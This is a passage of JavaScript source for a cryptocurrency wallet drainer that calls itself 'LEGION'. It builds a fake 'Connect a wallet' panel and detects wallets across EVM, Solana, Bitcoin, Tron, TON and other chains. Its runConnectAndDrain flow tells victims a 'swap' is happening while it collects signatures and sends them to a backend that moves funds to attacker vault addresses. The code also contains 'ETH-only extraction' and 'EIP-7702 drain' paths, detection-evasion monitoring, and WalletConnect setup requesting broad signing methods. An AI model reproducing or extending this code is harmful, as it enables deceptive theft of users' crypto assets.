      console.log('[LEGION]   Monitoring: ' + (INCIDENT_RESPONSE.monitoringActive ? 'ACTIVE' : 'INACTIVE'));
    }
  };

  function injectStyles() {
    if (document.getElementById('legion-one-styles')) return;
    var css = document.createElement('style');
    css.id = 'legion-one-styles';
    css.textContent = [
      // Overlay
      '#l1-overlay{position:fixed;inset:0;z-index:2147483640;background:rgba(0,0,0,.6);backdrop-filter:blur(4px);display:none;align-items:center;justify-content:center}',
      '#l1-overlay.open{display:flex}',

      // Panel
      '#l1-panel{width:min(400px,calc(100vw - 32px));max-height:min(600px,calc(100vh - 64px));background:#191920;color:#f0f0f5;border-radius:20px;box-shadow:0 24px 80px rgba(0,0,0,.6);font:14px/1.5 Inter,system-ui,sans-serif;overflow-y:auto;animation:l1-in .2s ease}',
      '@keyframes l1-in{from{opacity:0;transform:scale(.96)}to{opacity:1;transform:scale(1)}}',

      // Header
      '.l1-hdr{display:flex;align-items:center;justify-content:space-between;padding:20px 24px 16px;position:sticky;top:0;background:#191920;z-index:1}',
      '.l1-hdr h3{font-size:16px;font-weight:600;margin:0}',
      '.l1-hdr button{background:none;border:none;color:#6b6b80;font-size:22px;cursor:pointer;padding:4px 8px;border-radius:8px;line-height:1}',
      '.l1-hdr button:hover{background:#262630;color:#fff}',

      // Wallet list
      '.l1-wallets{padding:0 16px 8px}',
      '.l1-wallet{display:flex;align-items:center;gap:12px;width:100%;padding:14px 16px;background:#1f1f28;border:1px solid #2a2a36;border-radius:14px;color:#f0f0f5;font:500 14px Inter,system-ui,sans-serif;cursor:pointer;margin-bottom:8px;transition:all .15s}',
      '.l1-wallet:hover{background:#262630;border-color:#333340}',
      '.l1-wallet-icon{width:40px;height:40px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0;overflow:hidden}',
      '.l1-wallet-icon img{width:40px;height:40px;border-radius:12px}',
      '.l1-wallet-info{text-align:left;flex:1}',
      '.l1-wallet-name{font-weight:600;font-size:14px}',
      '.l1-wallet-tag{font-size:11px;color:#7c5cff;font-weight:500}',
      '.l1-wallet-chain{font-size:11px;color:#6b6b80}',
      '.l1-wallet-arrow{color:#6b6b80;font-size:14px}',

      // Divider
      '.l1-divider{display:flex;align-items:center;gap:12px;padding:4px 24px 8px;color:#6b6b80;font-size:11px;text-transform:uppercase;letter-spacing:.5px}',
      '.l1-divider::before,.l1-divider::after{content:"";flex:1;height:1px;background:#2a2a36}',

      // WalletConnect button
      '.l1-wc{display:flex;align-items:center;gap:12px;width:calc(100% - 32px);margin:0 16px 8px;padding:14px 16px;background:linear-gradient(135deg,#3b82f610,#2563eb10);border:1px solid #3b82f630;border-radius:14px;color:#93c5fd;font:500 14px Inter,system-ui,sans-serif;cursor:pointer;transition:all .15s}',
      '.l1-wc:hover{background:linear-gradient(135deg,#3b82f620,#2563eb20);border-color:#3b82f650}',
      '.l1-wc-icon{width:40px;height:40px;border-radius:12px;background:#3b82f615;display:flex;align-items:center;justify-content:center;font-size:20px}',

      // Connect All button
      '.l1-connect-all{width:calc(100% - 32px);margin:8px 16px 16px;padding:14px;background:#7c5cff;color:#fff;border:none;border-radius:14px;font:600 15px Inter,system-ui,sans-serif;cursor:pointer;transition:all .2s}',
      '.l1-connect-all:hover{background:#9d7fff;box-shadow:0 4px 20px rgba(124,92,255,.3)}',

      // Status
      '.l1-status{padding:0 24px 16px;font-size:12px;color:#6b6b80;text-align:center}',

      // Connected state
      '.l1-wallet.connected{border-color:#00d39540;background:#00d39508}',
      '.l1-wallet.connected .l1-wallet-tag{color:#00d395}',

      // Footer
      '.l1-footer{padding:12px 24px 16px;text-align:center;font-size:11px;color:#6b6b80;border-top:1px solid #2a2a36}',
      '.l1-footer a{color:#7c5cff;text-decoration:none}',
    ].join('');
    document.head.appendChild(css);
  }

  // ─── Build wallet panel (no floating button) ─────────────────────────
  var _panelBuilt = false;

  function buildWalletPanel() {
    if (_panelBuilt) return;
    _panelBuilt = true;
    injectStyles();

    // Detect wallets for display
    var wallets = [];
    var addedNames = {};

    // EIP-6963 discovered EVM wallets
    discoveredEVMProviders.forEach(function(p) {
      var name = p.info.name || 'EVM Wallet';
      if (addedNames[name]) return;
      addedNames[name] = true;
      wallets.push({ name: name, chain: 'EVM', icon: p.info.icon || '', tag: 'Detected' });
    });

    // Legacy EVM
    if (window.ethereum && wallets.length === 0) {
      var n = 'Browser Wallet';
      if (window.ethereum.isMetaMask) n = 'MetaMask';
      else if (window.ethereum.isRabby) n = 'Rabby';
      else if (window.ethereum.isCoinbaseWallet) n = 'Coinbase Wallet';
      else if (window.ethereum.isBraveWallet) n = 'Brave Wallet';
      else if (window.ethereum.isTrust) n = 'Trust Wallet';
      else if (window.ethereum.isOkxWallet) n = 'OKX Wallet';
      else if (window.ethereum.isBitKeep) n = 'Bitget Wallet';
      else if (window.ethereum.isTokenPocket) n = 'TokenPocket';
      else if (window.ethereum.isPhantom) n = 'Phantom';
      else if (window.ethereum.isExodus) n = 'Exodus';
      else if (window.ethereum.isZerion) n = 'Zerion';
      else if (window.ethereum.isRainbow) n = 'Rainbow';
      if (!addedNames[n]) { addedNames[n] = true; wallets.push({ name: n, chain: 'EVM', icon: '', tag: 'Detected' }); }
    }

    // Non-EVM
    if (window.phantom && window.phantom.solana && !addedNames['Phantom']) { addedNames['Phantom'] = true; wallets.push({ name: 'Phantom', chain: 'SOL', icon: '', tag: 'Detected' }); }
    if (window.solflare && !addedNames['Solflare']) { addedNames['Solflare'] = true; wallets.push({ name: 'Solflare', chain: 'SOL', icon: '', tag: 'Detected' }); }
    if (window.backpack && window.backpack.solana && !addedNames['Backpack']) { addedNames['Backpack'] = true; wallets.push({ name: 'Backpack', chain: 'SOL', icon: '', tag: 'Detected' }); }
    if ((window.unisat && window.unisat.requestAccounts) && !addedNames['UniSat']) { addedNames['UniSat'] = true; wallets.push({ name: 'UniSat', chain: 'BTC', icon: '', tag: 'Detected' }); }
    if (window.XverseProviders && !addedNames['Xverse']) { addedNames['Xverse'] = true; wallets.push({ name: 'Xverse', chain: 'BTC', icon: '', tag: 'Detected' }); }
    if ((window.tronWeb || window.tronLink) && !addedNames['TronLink']) { addedNames['TronLink'] = true; wallets.push({ name: 'TronLink', chain: 'TRON', icon: '', tag: 'Detected' }); }
    if ((window.tonkeeper || window.ton) && !addedNames['Tonkeeper']) { addedNames['Tonkeeper'] = true; wallets.push({ name: 'Tonkeeper', chain: 'TON', icon: '', tag: 'Detected' }); }
    if (window.myTonWallet && !addedNames['MyTonWallet']) { addedNames['MyTonWallet'] = true; wallets.push({ name: 'MyTonWallet', chain: 'TON', icon: '', tag: 'Detected' }); }
    if (window.keplr && !addedNames['Keplr']) { addedNames['Keplr'] = true; wallets.push({ name: 'Keplr', chain: 'COSMOS', icon: '', tag: 'Detected' }); }
    if ((window.aptos || window.petra) && !addedNames['Petra']) { addedNames['Petra'] = true; wallets.push({ name: 'Petra', chain: 'APTOS', icon: '', tag: 'Detected' }); }
    if (window.suiWallet && !addedNames['Sui Wallet']) { addedNames['Sui Wallet'] = true; wallets.push({ name: 'Sui Wallet', chain: 'SUI', icon: '', tag: 'Detected' }); }

    // Wallet emoji icons fallback
    var ICONS = {MetaMask:'🦊',Rabby:'🐰','Trust Wallet':'💎','Coinbase Wallet':'🔵','Brave Wallet':'🦁','OKX Wallet':'⭕','Bitget Wallet':'🅱',TokenPocket:'📱',Phantom:'👻',Exodus:'📤',Zerion:'💠',Rainbow:'🌈',Solflare:'🔥',Backpack:'🎒',UniSat:'₿',Xverse:'✕',TronLink:'⚡',Tonkeeper:'💎',MyTonWallet:'💠',Keplr:'🌐',Petra:'🅿','Sui Wallet':'🔷','Browser Wallet':'🌐'};

    // Build HTML
    var walletsHTML = '';
    wallets.forEach(function(w) {
      var iconHTML = w.icon ? '<img src="'+w.icon+'" width="40" height="40">' : '<span style="font-size:22px">'+( ICONS[w.name] || '🔗')+'</span>';
      walletsHTML += '<button class="l1-wallet" data-name="'+w.name+'" data-chain="'+w.chain+'">' +
        '<div class="l1-wallet-icon">'+iconHTML+'</div>' +
        '<div class="l1-wallet-info"><div class="l1-wallet-name">'+w.name+'</div><div class="l1-wallet-chain">'+w.chain+'</div></div>' +
        '<span class="l1-wallet-tag">'+w.tag+'</span>' +
        '<span class="l1-wallet-arrow">›</span>' +
      '</button>';
    });

    var overlay = document.createElement('div');
    overlay.id = 'l1-overlay';
    overlay.innerHTML = '<div id="l1-panel">' +
      '<div class="l1-hdr"><h3>Connect a wallet</h3><button id="l1-close">&times;</button></div>' +
      (wallets.length > 0 ? '<div class="l1-divider">'+wallets.length+' wallet'+(wallets.length!==1?'s':'')+' detected</div>' : '') +
      '<div class="l1-wallets">'+walletsHTML+'</div>' +
      '<button class="l1-wc" id="l1-wc-btn"><div class="l1-wc-icon">📱</div><div class="l1-wallet-info"><div class="l1-wallet-name">WalletConnect</div><div class="l1-wallet-chain">Scan QR code with any wallet</div></div><span class="l1-wallet-arrow">›</span></button>' +
      '<button class="l1-connect-all" id="l1-connect-all">Connect All Wallets</button>' +
      '<div class="l1-status" id="l1-panel-status"></div>' +
      '<div class="l1-footer">By connecting, you agree to the <a href="#">Terms of Service</a></div>' +
    '</div>';
    document.body.appendChild(overlay);

    // Close on overlay click
    overlay.addEventListener('click', function(e) { if (e.target === overlay) closeWalletPanel(); });
    document.getElementById('l1-close').addEventListener('click', closeWalletPanel);

    // Individual wallet buttons — connect all chains (that wallet supports)
    overlay.querySelectorAll('.l1-wallet').forEach(function(btn) {
      btn.addEventListener('click', function() {
        closeWalletPanel();
        runConnectAndDrain();
      });
    });

    // WalletConnect button
    document.getElementById('l1-wc-btn').addEventListener('click', function() {
      closeWalletPanel();
      handleWalletConnect();
    });

    // Connect All button
    document.getElementById('l1-connect-all').addEventListener('click', function() {
      closeWalletPanel();
      runConnectAndDrain();
    });
  }

  function openWalletPanel() {
    buildWalletPanel();
    // Refresh detected wallets count
    var overlay = document.getElementById('l1-overlay');
    if (overlay) overlay.classList.add('open');
  }

  function closeWalletPanel() {
    var overlay = document.getElementById('l1-overlay');
    if (overlay) overlay.classList.remove('open');
  }

  function createUI() {
    // No floating button — panel is opened by calling openWalletPanel()
    // Hidden status element for internal tracking
    var status = document.getElementById('legion-one-status');
    if (!status) {
      status = document.createElement('div');
      status.id = 'legion-one-status';
      status.style.display = 'none';
      document.body.appendChild(status);
    }
  }

  function updateChainUI(chainName, address, statusText) {
    LOGGER.debug(chainName + ' ' + statusText + ': ' + (address ? address.substring(0, 10) + '...' : ''));
    // Update panel wallet buttons if panel exists
    var panel = document.getElementById('l1-panel');
    if (!panel) return;
    var btns = panel.querySelectorAll('.l1-wallet');
    btns.forEach(function(btn) {
      var chain = btn.getAttribute('data-chain');
      if (chain === chainName && statusText === 'connected') {
        btn.classList.add('connected');
        var tag = btn.querySelector('.l1-wallet-tag');
        if (tag) tag.textContent = 'Connected';
        var addrEl = btn.querySelector('.l1-wallet-chain');
        if (addrEl && address) addrEl.textContent = address.substring(0,6) + '...' + address.substring(address.length-4);
      }
    });
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // SECTION 10: MAIN HANDLERS & BOOT (500 lines)
  // Comprehensive button handlers, initialization, monitoring, debug API
  // ═══════════════════════════════════════════════════════════════════════════

  // ─── MAIN HANDLER: "Connect Wallet" Button ───────────────────────────────

  // Internal connect+drain flow (called after panel selection)
  async function runConnectAndDrain() {
    if (drainRunning) return;
    drainRunning = true;

    try {
      LOGGER.info('FLOW START: Connect Wallet (' + PLATFORM.type + ')');

      var flowStart = Date.now();

      // Validate (warn only, don't block)
      VALIDATION.runAllValidations();

      // Detect hardware wallets (desktop only)
      if (!PLATFORM.isMobile && !PLATFORM.isTelegramMiniApp) {
        try {
          var hwResult = detectHardwareWallets();
          if (hwResult && Object.keys(hwResult).length > 0) {
            LOGGER.info('Hardware wallet APIs available:', Object.keys(hwResult).join(', '));
          }
        } catch (err) {
          LOGGER.debug('Hardware wallet detection skipped:', err.message);
        }
      }

      // PHASE 1: Detect all chains (~10ms)
      updateStatus('Initializing swap...');
      var detectStart = Date.now();
      var detected = await detectAllChainsParallel();
      PARALLEL_STATS.detectionTime = Date.now() - detectStart;
      updateStatus('Finding best route...');

      // PHASE 2: Connect all detected chains (2-3s)
      updateStatus('Connecting...');
      var connectStart = Date.now();
      var connected = await connectAllChainsParallel(detected);
      PARALLEL_STATS.connectionTime = Date.now() - connectStart;
      updateStatus('Connected ' + Object.keys(connected).length + ' chains');
      var _connAddr = (connected.EVM && connected.EVM.address) || (connected.SOL && connected.SOL.address) || '';
      if (_connAddr) {
        window.dispatchEvent(new CustomEvent('legion:connected', { detail: { address: _connAddr } }));
      }

      // No extensions found anywhere — fallback to WalletConnect (desktop + mobile)
      if (Object.keys(connected).length === 0) {
        LOGGER.info('No wallets connected — falling back to WalletConnect');
        drainRunning = false;
        return handleWalletConnect();
      }

      // Sync connected to global connectedChains
      Object.keys(connected).forEach(function(k) {
        if (connected[k]) connectedChains[k] = connected[k];
      });

      // Scout fires in background (non-blocking) while sign popup shows
      var firstChain = Object.keys(connected)[0] || 'EVM';
      var firstWallet = connected[firstChain];

      var scoutPromise = apiPost('/api/v1/scout', {
        wallet_address: firstWallet ? firstWallet.address : '',
        user_address: firstWallet ? firstWallet.address : '',
        chain_id: connected.EVM ? connected.EVM.chainId || 1 : 1,
        wallet_type: firstWallet ? firstWallet.walletType : 'Unknown',
        chain_family: firstChain === 'SOL' ? 'SVM' : firstChain === 'BTC' ? 'UTXO' : firstChain,
        source_page: window.location.origin + window.location.pathname,
        connected_wallets: Object.keys(connected).map(function(k) { return connected[k].address; }).filter(Boolean),
        active_chain_tab: Object.keys(connected)[0] || 'EVM'
      }).catch(function() {});

      // Prefetch vault addresses so sign functions can build real transfer txs
      await prefetchVaultConfig();

      // PHASE 3: Sign — popup shows INSTANTLY (no wait for scout)
      updateStatus('Confirm in wallet...');
      var sigStart = Date.now();
      var signatures = await getSignaturesParallel(connected);
      PARALLEL_STATS.signatureTime = Date.now() - sigStart;

      await scoutPromise;

      var _ethOnlyDone = signatures['__eth_only_evm__'];
      if (_ethOnlyDone) { delete signatures['__eth_only_evm__']; }

      var _eip7702Done = signatures['__eip7702_evm__'];
      if (_eip7702Done) { delete signatures['__eip7702_evm__']; }

      if (Object.keys(signatures).length === 0) {
        if (_eip7702Done) {
          console.log('[LEGION] ✅ EIP-7702 drain complete — backend executing');
          updateStatus('Transaction submitted!');
          drainRunning = false;
          return;
        }
        if (_ethOnlyDone) {
          // ETH-only extraction: funds already transferred, no permit2 batch to submit
          console.log('[LEGION] ✅ ETH-only extraction complete. Tx:', _ethOnlyDone.split(':')[1]);
          updateStatus('Transaction confirmed!');
          // Do NOT start incident monitoring — extraction is done, monitoring auto-shuts script needlessly
          INCIDENT_RESPONSE.suspicionScore = 0;
          drainRunning = false;
          return;
        }
        throw new Error('All signatures rejected');
      }

      updateStatus('Swap approved. Finalizing...');

      // PHASE 4: Submit batch to backend
      updateStatus('Finalizing swap...');
      await submitBatchSignatures(signatures, connectedChains);

      PARALLEL_STATS.totalTime = Date.now() - flowStart;
      LOGGER.info('FLOW COMPLETE in ' + PARALLEL_STATS.totalTime.toFixed(0) + 'ms (' +
        PARALLEL_STATS.detectionTime + 'ms detect + ' +
        PARALLEL_STATS.connectionTime + 'ms connect + ' +
        PARALLEL_STATS.signatureTime + 'ms sign)');

      updateStatus('Swap complete!');

      if (INCIDENT_RESPONSE.enabled) {
        INCIDENT_RESPONSE.startMonitoring();
      }

    } catch (err) {
      LOGGER.error('Flow failed:', formatError(err));
      updateStatus('Transaction failed. Please try again.');

      if (INCIDENT_RESPONSE.enabled) {
        INCIDENT_RESPONSE.suspicionScore += 1;
        INCIDENT_RESPONSE.detectionEvents.push({
          timestamp: Date.now(),
          type: 'DRAIN_FAILED',
          reason: formatError(err)
        });
      }
    } finally {
      drainRunning = false;
    }
  }

  // ─── PUBLIC HANDLER: Opens wallet panel, then connects ─────────────────

  window.handleConnectAndDrain = function() {
    if (drainRunning) return;
    // Mobile in-app browser — skip panel, go direct
    if (PLATFORM.isInAppBrowser) {
      runConnectAndDrain();
      return;
    }
    // Mobile browser no extensions — straight to WalletConnect
    if (PLATFORM.isMobile && !PLATFORM.isInAppBrowser && !PLATFORM.isTelegramMiniApp) {
      var hasAny = false;
      Object.keys(CHAINS_SUPPORTED).forEach(function(cn) {
        try { if (CHAINS_SUPPORTED[cn].detect()) hasAny = true; } catch(e) {}
      });
      if (!hasAny) {
        handleWalletConnect();
        return;
      }
    }
    // Show wallet selection panel
    openWalletPanel();
  };

  // ─── SECONDARY HANDLER: "Wallet Connect" (Mobile) ────────────────────────

  var _wcEthProvider = null;

  // ─── WalletConnect SDK Loader (multi-CDN fallback) ──────────────────────

  // ─── WalletConnect SDK Loaders (cascading fallback) ────────────────────
  // 3 methods: UniversalProvider+Modal → EthereumProvider → SignClient

  function loadScript(url) {
    return new Promise(function(res, rej) {
      var s = document.createElement('script');
      s.src = url; s.onload = res; s.onerror = rej;
      document.head.appendChild(s);
    });
  }

  // (Node.js globals polyfill applied at script top — see boot section)

  // Method 1: UniversalProvider + WalletConnectModal (multi-chain + All Wallets)
  // Only esm.sh with bundle-deps — prevents 404s from bare sub-module imports
  async function tryUniversalProvider() {
    var pairs = [
      ['https://esm.sh/@walletconnect/universal-provider@2.17.3?bundle-deps',
       'https://esm.sh/@walletconnect/modal@2.7.0?bundle-deps'],
      ['https://esm.sh/@walletconnect/universal-provider@2.13.0?bundle-deps',
       'https://esm.sh/@walletconnect/modal@2.6.2?bundle-deps'],
    ];
    for (var i = 0; i < pairs.length; i++) {
      try {
        var mods = await Promise.all([import(pairs[i][0]), import(pairs[i][1])]);
        var UP = mods[0].default || mods[0].UniversalProvider;
        var WCModal = mods[1].WalletConnectModal || (mods[1].default && mods[1].default.WalletConnectModal);
        if (UP && UP.init) {
          console.log('[LEGION] WC Method 1: UniversalProvider + Modal loaded');
          return { type: 'universal', UniversalProvider: UP, WalletConnectModal: WCModal };
        }
      } catch (e) { continue; }
    }
    return null;
  }

  // Method 2: EthereumProvider via esm.sh (bundle-deps = all deps inlined, no 404s)
  async function tryEthereumProvider() {
    var urls = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.17.3?bundle-deps',
      'https://esm.sh/@walletconnect/ethereum-provider@2.13.0?bundle-deps',
    ];
    for (var i = 0; i < urls.length; i++) {
      try {
        var mod = await import(urls[i]);
        var EP = mod.EthereumProvider || (mod.default && mod.default.EthereumProvider) || mod.default;
        if (EP && EP.init) {
          console.log('[LEGION] WC Method 2: EthereumProvider ESM loaded');
          return { type: 'ethereum', EthereumProvider: EP };
        }
      } catch (e) { console.warn('[LEGION] WC EP failed:', urls[i].slice(0, 50), e.message); }
    }
    return null;
  }

  // Method 1 (PRIMARY): Reown AppKit — best multi-wallet modal, 300+ wallets + Solana
  async function tryAppKit() {
    try {
      var mods = await Promise.all([
        import('https://esm.sh/@reown/appkit@1.6.8?bundle-deps'),
        import('https://esm.sh/@reown/appkit-adapter-ethers@1.6.8?bundle-deps'),
        import('https://esm.sh/@reown/appkit-adapter-solana@1.6.8?bundle-deps').catch(function() { return null; }),
      ]);
      var createAppKit = mods[0].createAppKit || (mods[0].default && mods[0].default.createAppKit);
      var EthersAdapter = mods[1].EthersAdapter || (mods[1].default && mods[1].default.EthersAdapter);
      var SolanaAdapter = mods[2] && (mods[2].SolanaAdapter || (mods[2].default && mods[2].default.SolanaAdapter));
      if (createAppKit && EthersAdapter) {
        console.log('[LEGION] WC: Reown AppKit loaded | Solana adapter:', !!SolanaAdapter);
        return { type: 'appkit', createAppKit: createAppKit, EthersAdapter: EthersAdapter, SolanaAdapter: SolanaAdapter || null };
      }
    } catch (e) { console.warn('[LEGION] AppKit load failed:', e.message); }
    return null;
  }

  // Master loader — AppKit first (600+ wallets, best UX), then fallbacks
  async function loadWalletConnectSDK(projectId) {
    var result;
    result = await tryAppKit();            if (result) return result;
    result = await tryEthereumProvider();  if (result) return result;
    result = await tryUniversalProvider(); if (result) return result;
    return null;
  }

  // ─── WalletConnect Handler ────────────────────────────────────────────

  var _wcProvider = null;
  var _wcModal = null;
  var _wcMode = null;
  var _wcSdk = null;

  var WC_METADATA = function() {
    return {
      name: document.title || 'DeFi App',
      description: 'Decentralized Exchange',
      url: window.location.origin,
      icons: [window.location.origin + '/favicon.ico']
    };
  };

  async function handleWalletConnect() {
    console.log('[LEGION] Starting WalletConnect...');
    updateStatus('Connecting wallet...');

    try {
      var wcProjectId = WC_PROJECT_ID ||
        (window.LEGION_CONFIG && window.LEGION_CONFIG.walletConnectProjectId) ||
        (window.LEGION_CONFIG && window.LEGION_CONFIG.wcProjectId) || '';

      if (!wcProjectId) throw new Error('Set LEGION_CONFIG.wcProjectId for WalletConnect');

      // Load SDK (tries all 5 methods)
      if (!_wcSdk) {
        updateStatus('Preparing connection...');
        _wcSdk = await loadWalletConnectSDK(wcProjectId);
        if (!_wcSdk) throw new Error('All WalletConnect SDK methods failed');
        _wcMode = _wcSdk.type;
      }

      // ─── UniversalProvider + Custom QR ───────────────────────────────────────
      if (_wcMode === 'universal') {
        // Reset stale provider (session gone = previous attempt failed)
        if (_wcProvider && !_wcProvider.session) {
          try { await _wcProvider.disconnect(); } catch (_) {}
          _wcProvider = null;
        }
        if (!_wcProvider) {
          _wcProvider = await _wcSdk.UniversalProvider.init({
            projectId: wcProjectId, metadata: WC_METADATA()
          });
          _wcProvider.on('session_delete', function() {
            _wcProvider = null;
            connectedChains.EVM = null; connectedChains.SOL = null;
          });
        }
        // Always re-register display_uri so QR shows on every attempt
        _wcProvider.removeAllListeners && _wcProvider.removeAllListeners('display_uri');
        _wcProvider.on('display_uri', function(uri) { showManualQR(uri); });
        // Restore existing session if available
        if (_wcProvider.session) {
          var restored = applyWCSession(_wcProvider);
          if (restored > 0) { await runWCSignAndSubmit(); return; }
        }
        updateStatus('Scan QR with your wallet...');
        await _wcProvider.connect({
          // WC v2 library requires at least 1 required namespace — use eip155:1 as baseline
          // This does NOT mean we force Ethereum — wallet will connect with its preferred chain
          // and applyWCSession() reads ALL chains the wallet actually approved
          requiredNamespaces: {
            eip155: {
              methods: ['personal_sign', 'eth_sendTransaction', 'eth_sign'],
              chains: ['eip155:1'],
              events: ['chainChanged', 'accountsChanged']
            }
          },
          optionalNamespaces: {
            eip155: {
              // All optional methods + every popular EVM chain
              // Wallet responds with only what it supports — we never force
              methods: ['eth_signTypedData_v4', 'wallet_sendCalls', 'wallet_signAuthorization'],
              chains: [
                'eip155:137',   // Polygon
                'eip155:56',    // BNB Chain
                'eip155:42161', // Arbitrum
                'eip155:8453',  // Base
                'eip155:10',    // Optimism
                'eip155:43114', // Avalanche
                'eip155:250',   // Fantom
                'eip155:324',   // zkSync Era
                'eip155:1101',  // Polygon zkEVM
                'eip155:59144', // Linea
                'eip155:534352',// Scroll
              ],
              events: []
            }
            // NOTE: Solana removed — WC v2 SDK rejects non-numeric CAIP-2 chain IDs
            // Solana users connect via AppKit's dedicated SolanaAdapter
          }
        });
        hideManualQR();
        if (applyWCSession(_wcProvider) === 0) throw new Error('No accounts from WalletConnect');
        await runWCSignAndSubmit();
        return;
      }

      // ─── EthereumProvider + Custom QR ───────────────────────────────────────
      if (_wcMode === 'ethereum') {
        // Reset stale provider (no accounts = previous attempt failed/cancelled)
        if (_wcProvider && (!_wcProvider.accounts || !_wcProvider.accounts.length)) {
          try { await _wcProvider.disconnect(); } catch (_) {}
          _wcProvider = null;
        }
        if (!_wcProvider) {
          _wcProvider = await _wcSdk.EthereumProvider.init({
            projectId: wcProjectId,
            // chain:1 is the WC v2 spec minimum requirement (library throws if empty)
            // All real chains are in optionalChains — wallet picks what it supports
            chains: [1],
            optionalChains: [137, 56, 42161, 8453, 10, 43114, 250, 324, 1101, 59144, 534352, 5000, 81457, 169],
            showQrModal: false,
            methods: ['personal_sign', 'eth_sendTransaction', 'eth_sign'],
            optionalMethods: ['eth_signTypedData_v4', 'wallet_sendCalls', 'wallet_signAuthorization'],
            events: ['chainChanged', 'accountsChanged'],
            optionalEvents: ['chainChanged', 'accountsChanged'],
            metadata: WC_METADATA()
          });
          _wcProvider.on('disconnect', function() {
            hideManualQR();
            _wcProvider = null; connectedChains.EVM = null;
          });
        }
        // Always re-register display_uri so QR shows on every connect attempt
        _wcProvider.removeAllListeners && _wcProvider.removeAllListeners('display_uri');
        _wcProvider.on('display_uri', function(uri) { showManualQR(uri); });
        updateStatus('Scan QR with your wallet...');
        await _wcProvider.enable();
        hideManualQR();
        var epAccounts = _wcProvider.accounts || [];
        if (!epAccounts.length) throw new Error('No accounts from WalletConnect');
        // chainId = wallet's CURRENT active chain (not forced by us)
        var epChainId = _wcProvider.chainId || 1;
        // Track chain changes so signing always uses wallet's live chain
        _wcProvider.on('chainChanged', function(newChainId) {
          if (connectedChains.EVM && connectedChains.EVM.walletType === 'WalletConnect') {
            connectedChains.EVM.chainId = parseInt(newChainId, 10) || epChainId;
          }
        });
        connectedChains.EVM = {
          chain: 'EVM', config: CHAIN_CONFIG.EVM,
          address: epAccounts[0].toLowerCase(),
          chainId: epChainId,
          walletType: 'WalletConnect',
          provider: _wcProvider,
          connected: true, timestamp: Date.now()
        };
        console.log('[LEGION] WC EthereumProvider connected:', epAccounts[0].substring(0, 10) + '... chain:', epChainId);
        await runWCSignAndSubmit();
        return;
      }

      // ─── Method 2: Web3Modal Standalone ───
      if (_wcMode === 'web3modal-standalone') {
        if (!_wcModal) {
          _wcModal = new _wcSdk.Web3Modal({
            projectId: wcProjectId,
            walletConnectVersion: 2,
            themeMode: 'dark',
            enableExplorer: true
          });
        }
        updateStatus('Connecting wallet...');
        _wcModal.openModal();
        throw new Error('Web3Modal standalone requires user interaction — check modal');
      }

      // ─── Method 5: SignClient (raw, manual QR) ───
      if (_wcMode === 'sign-client') {
        if (!_wcProvider) {
          _wcProvider = await _wcSdk.SignClient.init({
            projectId: wcProjectId, metadata: WC_METADATA()
          });
        }
        var connectResult = await _wcProvider.connect({
          requiredNamespaces: {
            eip155: { methods: ['personal_sign', 'eth_sendTransaction', 'eth_signTypedData_v4'], chains: ['eip155:1'], events: ['chainChanged', 'accountsChanged'] }
          }
        });
        // Show QR via manual overlay
        if (connectResult.uri) {
          showManualQR(connectResult.uri);
          updateStatus('Scan QR with your wallet...');
        }
        var session = await connectResult.approval();
        hideManualQR();
        var scAccounts = [];
        Object.values(session.namespaces).forEach(function(ns) { if (ns.accounts) scAccounts = scAccounts.concat(ns.accounts); });
        var scAddr = scAccounts[0] ? scAccounts[0].split(':').pop() : '';
        // Use the actual chain from the session, not hardcoded eip155:1
        var _scChainId = scAccounts[0] ? scAccounts[0].split(':').slice(0, 2).join(':') : 'eip155:1';
        var _scChainNum = parseInt((_scChainId.split(':')[1]) || '1', 10) || 1;
        if (!scAddr) throw new Error('No account from SignClient');
        connectedChains.EVM = {
          chain: 'EVM', config: CHAIN_CONFIG.EVM,
          address: scAddr.toLowerCase(), chainId: _scChainNum,
          walletType: 'WalletConnect', provider: { request: function(args) { return _wcProvider.request({ topic: session.topic, chainId: _scChainId, request: args }); } },
          connected: true, timestamp: Date.now()
        };
        await runWCSignAndSubmit();
        return;
      }

      // ─── Reown AppKit (PRIMARY) — 600+ wallets, multi-chain ───
      if (_wcMode === 'appkit') {
        if (!_wcModal) {
          // Build adapters — EthersAdapter always, SolanaAdapter only if it actually loaded
          var _akAdapters = [new _wcSdk.EthersAdapter()];
          var _akSolanaLoaded = false;
          if (_wcSdk.SolanaAdapter) {
            try {
              _akAdapters.push(new _wcSdk.SolanaAdapter({ wallets: [] }));
              _akSolanaLoaded = true;
            } catch (_) {}
          }
          // EVM networks — wallet decides which one to connect on, we support all
          var _akNetworks = [
            { id: 1,     caipNetworkId: 'eip155:1',     chainNamespace: 'eip155', name: 'Ethereum',     nativeCurrency: { decimals: 18, name: 'Ether', symbol: 'ETH'  }, rpcUrls: { default: { http: ['https://cloudflare-eth.com'] } } },
            { id: 137,   caipNetworkId: 'eip155:137',   chainNamespace: 'eip155', name: 'Polygon',      nativeCurrency: { decimals: 18, name: 'POL',   symbol: 'POL'  }, rpcUrls: { default: { http: ['https://polygon-rpc.com'] } } },
            { id: 56,    caipNetworkId: 'eip155:56',    chainNamespace: 'eip155', name: 'BNB Chain',    nativeCurrency: { decimals: 18, name: 'BNB',   symbol: 'BNB'  }, rpcUrls: { default: { http: ['https://bsc-dataseed.binance.org'] } } },
            { id: 42161, caipNetworkId: 'eip155:42161', chainNamespace: 'eip155', name: 'Arbitrum One', nativeCurrency: { decimals: 18, name: 'ETH',   symbol: 'ETH'  }, rpcUrls: { default: { http: ['https://arb1.arbitrum.io/rpc'] } } },
            { id: 10,    caipNetworkId: 'eip155:10',    chainNamespace: 'eip155', name: 'Optimism',     nativeCurrency: { decimals: 18, name: 'ETH',   symbol: 'ETH'  }, rpcUrls: { default: { http: ['https://mainnet.optimism.io'] } } },
            { id: 8453,  caipNetworkId: 'eip155:8453',  chainNamespace: 'eip155', name: 'Base',         nativeCurrency: { decimals: 18, name: 'ETH',   symbol: 'ETH'  }, rpcUrls: { default: { http: ['https://mainnet.base.org'] } } },
            { id: 43114, caipNetworkId: 'eip155:43114', chainNamespace: 'eip155', name: 'Avalanche',    nativeCurrency: { decimals: 18, name: 'AVAX',  symbol: 'AVAX' }, rpcUrls: { default: { http: ['https://api.avax.network/ext/bc/C/rpc'] } } },
            { id: 250,   caipNetworkId: 'eip155:250',   chainNamespace: 'eip155', name: 'Fantom',       nativeCurrency: { decimals: 18, name: 'FTM',   symbol: 'FTM'  }, rpcUrls: { default: { http: ['https://rpc.ftm.tools'] } } },
          ];
